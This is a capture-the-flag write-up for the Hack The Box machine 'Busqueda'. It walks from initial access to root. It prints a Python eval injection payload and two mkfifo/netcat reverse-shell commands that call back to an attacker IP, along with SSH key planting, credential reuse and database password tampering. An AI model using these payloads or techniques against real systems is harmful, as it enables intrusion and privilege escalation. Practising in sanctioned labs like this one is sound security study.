# [Busqueda](https://app.hackthebox.com/machines/Busqueda) <!-- omit in toc --> 

This was my first pwned box and even though it's an easy box it has some tricky points in my opinion.

## Table of Contents  <!-- omit in toc --> 
- [User Access](#user-access)
- [Privilege Escalation](#privilege-escalation)
- [Final Thoughts](#final-thoughts)

## User Access

Let's start with some pretty standard enumeration using nmap.

``` console
$ nmap -sV -sC 10.10.11.208
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-24 13:11 EDT
Nmap scan report for searcher.htb (10.10.11.208)
Host is up (0.040s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
|_http-title: Searcher
9000/tcp open  http    SimpleHTTPServer 0.6 (Python 3.10.6)
|_http-server-header: SimpleHTTP/0.6 Python/3.10.6
|_http-title: Gitea: Git with a cup of tea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.87 seconds
```

We have some standard stuff going on, ssh, a webserver running on port 80 and another webservice called [gitea](https://github.com/go-gitea/gitea) which is a sort of lightweight git self-hosted service.

When trying to visit 10.10.11.208 we get redirected to http://searcher.htb/, just add it to the */etc/hosts* file.

The webpage presents as a simple service to generate search query for different engines such as Amazon, Google, Bing, and many more. The form is quite simple and it has two main fields: "*engine*" and "*query*".

The idea here is to inject something using this form.

If you look carefully enough you can see at the footer of the page something really interesting:

```
Powered by Flask and Searchor 2.4.0
```
[Flask](https://flask.palletsprojects.com/) is a python framework while [Searchor](https://github.com/ArjunSharda/Searchor) looks like a python library that is used by this webpage. Looking a bit deeper inside the Github repository of Searchor we can find something that is really useful regarding [release v2.4.2](https://github.com/ArjunSharda/Searchor/releases/tag/v2.4.2f).

According to the Github release history, version 2.4.2 fixed a very bad vulnerability allowing execution of arbitrary code like explained in the [pull request](https://github.com/ArjunSharda/Searchor/pull/130).

The good part is that the webpage advertised version 2.4.0 so it should be running a vulnerable version, let's jump into the code to see how to exploit the vulnerability.

You can see the vulnerable line with full context [here](https://github.com/ArjunSharda/Searchor/blob/v2.4.0/src/searchor/main.py#L33).

``` python
url = eval(f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})")
```
The application is basically calling the python [eval](https://docs.python.org/3/library/functions.html#eval) function without sanitizing any arguments, therefore we can inject whatever python code we want.

Let's then setup the reverse shell:

``` console
$ nc -vlp 9001
```

Now, to make the server connect and giving us a shell fill the form with the query field as follow:

```
',copy_url=__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.153 9001 >/tmp/f'))#
```

And we're in, we can see it on our netcat:
```console
listening on [any] 9001 ...
connect to [10.10.14.153] from searcher.htb [10.10.11.208] 51902
$ whoami
svc
```

First part is gone, you can find the flag in ~/user.txt.

## Privilege Escalation

Time for the privilege escalation part, the web application was running under *svc* user, lets get root.
First thing first, let's consolidate our access to the system adding our public key to the allowed ssh keys:

```console
$ cd ~
$ mkdir .ssh
$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDOfvoHVPI2DL/rTpaOCgavmJskulDs5ugzPYmTtTFOR5IHXiFYeyDZRCZFfwK3PYQVY48T5Csl3kSd1XTcvgiknMYfmxieBRIZKQdG5i3nWRMnbhlkbOpz/NUNFF+5yZZp7LAr+Hfa1ALnqyHtg5QC69mr2BN4lnpiMXq3MPaxbfZbtePcFfvNQJ9TETlEp910+jQNS7Jabq6wo2ujtO21inp4rZaBlPFCoLrh1TpOOILTtio0y3AREhIK0iWO+hNQYn+DhaVbe19ak1f4I3S5umr/e7P8bfGhbXdmlNgIBq4S9e7VIrW5xRIytk7PncMDPoFiXxE9fmXpFz3t2gGCrGoOKl5CK8yyJh/SKpkujLAtekyn0drKw/4JVUinlTp+tqdFPkdkVSvooaFLLL56nd9MeK2goCzqEHzrc2VPHU+zq8QIMYktFy/qUvUhvWEbQQRWZlVyzPhDfUu25wVQNKtMrBYIP261db+GyjUx/uC2MUka+laf06tdXtJwSEE=" > .ssh/authorized_keys
$ exit
```

Let's reconnect using ssh:

```console
$ ssh svc@searcher.htb     
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64)

...

svc@busqueda:~$
```

Okay, first thing let's see if we can run *sudo* and what command we can execute:

```console
svc@busqueda:~$ sudo -l
[sudo] password for svc:
```

Of course we need a password, looking around in the webapp folder we can find something really useful:

```console
svc@busqueda:/var/www/app$ ls -al
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1 14:22 app.py
drwxr-xr-x 8 www-data www-data 4096 Apr 24 17:26 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 templates
svc@busqueda:/var/www/app$ git remote -v
fatal: detected dubious ownership in repository at '/var/www/app'
To add an exception for this directory, call:

        git config --global --add safe.directory /var/www/app
svc@busqueda:/var/www/app$ git config --global --add safe.directory /var/www/app
svc@busqueda:/var/www/app$ git remote -v
origin  http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git (fetch)
origin  http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git (push)
```

Here we have gathered many useful informations:
- We have a local git host account (remember the gitea server we enumerated in the beginning?)
- We have plain text credentials for user *cody* (password: **jh1usoih2bkjaspwe92**)

You know, sometimes password get reused for many different things, as a matter of fact, that one is also the password for *sudo*.

```console
svc@busqueda:/var/www/app$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
svc@busqueda:/var/www/app$ cat /opt/scripts/system-checkup.py 
cat: /opt/scripts/system-checkup.py: Permission denied
svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py --help
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

Here we have a lot more informations gained:
- We can run sudo, but we're just allowed to run a specific python3 script
- We cannot read the python script
- The python script suggests that we can run 3 different sub-commands:
    + docker-ps
    + docker-inspect
    + full-checkup
- From the above list we can tell that there is a docker running on ther server

To dive a bit more deep let's try those commands:

```console
svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 months ago   Up 2 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 months ago   Up 2 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db

svc@busqueda:/var/www/app$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```

We're gaining a lot more informations, we have 2 containers running:
- The gitea instance (now we know it's dockerized) exposing port 3000 and 22 (over local 222)
- A MySQL instance exposing port 3306 and 33060

Let's get a bit more using *docker-inspect*, documentation of the command can be found on the [docker docs site](https://docs.docker.com/engine/reference/commandline/inspect/).

```console
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect "{{json .}}" gitea
...
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect "{{json .}}" mysql_db
...
```

I omitted the output because json is not easy easy too read if not well-formatted, you can find a readable version of the commands output in [gitea-docker-inspect.json](gitea-docker-inspect.json) and in [mysql-docker-inspect.json](mysql-docker-inspect.json). 

Anyhow, let's recap the informations gained from running the above commands:
- The MySQL database is linked with the gitea instance
- We gained the database name, user and password used by the gitea instance to connect
- We gained the mysql root password

At this point let's try the last command before looking into the database and gitea instances.

```console
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
Something went wrong
```

The *full-checkup* command seems to have some sort of problem, hard to figure out for now.

Going into firefox and browsing the gitea instance I didn't find much, even if logged in with cody user.
I decided to login as admin but I didn't know the password so I decided to jump into the database.

```console
svc@busqueda:~$ mysql -h 127.0.0.1 -u root --password jI86kGUuj87guWr3RyF
Enter password: 
ERROR 1045 (28000): Access denied for user 'root'@'172.19.0.1' (using password: YES)
svc@busqueda:~$ mysql -h 127.0.0.1 -u root --password=jI86kGUuj87guWr3RyF
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 125
Server version: 8.0.31 MySQL Community Server - GPL

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases
    -> ;
+--------------------+
| Database           |
+--------------------+
| gitea              |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)
mysql> use gitea;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------------+
| Tables_in_gitea           |
+---------------------------+
| access                    |
| access_token              |
| action                    |
| app_state                 |
| attachment                |
| badge                     |
| collaboration             |
| comment                   |
...
91 rows in set (0.00 sec)

mysql> select name,salt,passwd from user;
+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+
| name          | salt                             | passwd                                                                                               |
+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+
| administrator | a378d3f64143b284f104c926b8b49dfb | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 |
| cody          | d1db0a75a18e50de754be2aafcad5533 | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e |
+---------------+----------------------------------+------------------------------------------------------------------------------------------------------+
2 rows in set (0.00 sec)
```

I couldn't quite figure out the hashing algorithm in order to set a custom password for administrator, and I didn't want to look at the gitea sources nor try to crach the hash so i decided to copy the same salt and password from the cody user.

```console
mysql> update user set salt="d1db0a75a18e50de754be2aafcad5533", passwd="b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e" where name="administrator";
Query OK, 1 row affected (0.00 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

At this point you can login to gitea using the same password of the cody user.
Logging in the gitea instance admin will expose a repository containing administrations scripts, in particular the one that you can run as sudo with the *svc* user.
I copied over the scripts in this repository for the sake of documentation in the [gitea-administrator-scripts](./gitea-administrator-scripts) sub-folder.

We can see from the [system-checkup.py](./gitea-administrator-scripts/system-checkup.py) that the action full-checkup has a huge problem, which is also the reason we had the *something went wrong* message before. The python script is trying to launch a script called *full-checkup.sh* but instead of running it from the absolute path, is trying to run it from the current path, therefore we can create whatever *full-checkup.sh* file and run an arbitrary script.

For example, let's put a reversh shell command inside a newly created *full-checkup.sh*:

```sh
#!/bin/bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.10.14.153 1234 >/tmp/f
```

and run it with the:

```console
svc@busqueda:/tmp/.mydir$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

on our nc we can see something like this:

```console
$ nc -vlp 1234 
listening on [any] 1234 ...
connect to [10.10.14.153] from searcher.htb [10.10.11.208] 42114
# whoami
root
# cd ~
# ls
ecosystem.config.js
root.txt
scripts
snap
```

There we go, we got root!

## Final Thoughts
This was my first box and it was really fun, the points that lost me a lot of time were:
- Crafting a working payload for the user reverse shell in the searchor web-app
- Thinking I could exploit the *docker-inspect* command (look into template injection)
- Thinking that i could simply change the *system-checkup.py* once i gained access to gitea

In the end I think it was pretty straightforward for an experienced person, which I'm not, but I managed.
